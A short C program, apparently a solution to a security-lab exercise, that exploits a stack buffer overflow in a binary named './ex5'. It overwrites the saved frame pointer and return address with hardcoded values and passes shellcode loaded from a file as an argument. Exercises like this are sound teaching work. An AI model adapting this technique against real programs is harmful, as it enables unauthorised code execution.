#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>

struct {
 char buf[32];
 char padding[8];
 uint32_t saved_ebp;
 uint32_t return_addr;
 char null;
} overflow;

unsigned char shellcode[704];

int main (int argc, char *argv[]) {
 int fd;
 memset(&overflow, 'A', sizeof(overflow));
 overflow.null = 0;

 overflow.saved_ebp = 0x42424242;
 overflow.return_addr = 0x08049740;

 memset(shellcode, 0, sizeof(shellcode));
 fd = open("shellcode", O_RDONLY);
 read(fd, shellcode, sizeof(shellcode));
 close(fd);

 char *const exec_argv[] = {
   "./ex5",
   (char*)shellcode,
   (char*)&overflow,
   NULL
 };

 execv(exec_argv[0], exec_argv);

 return EXIT_SUCCESS;
}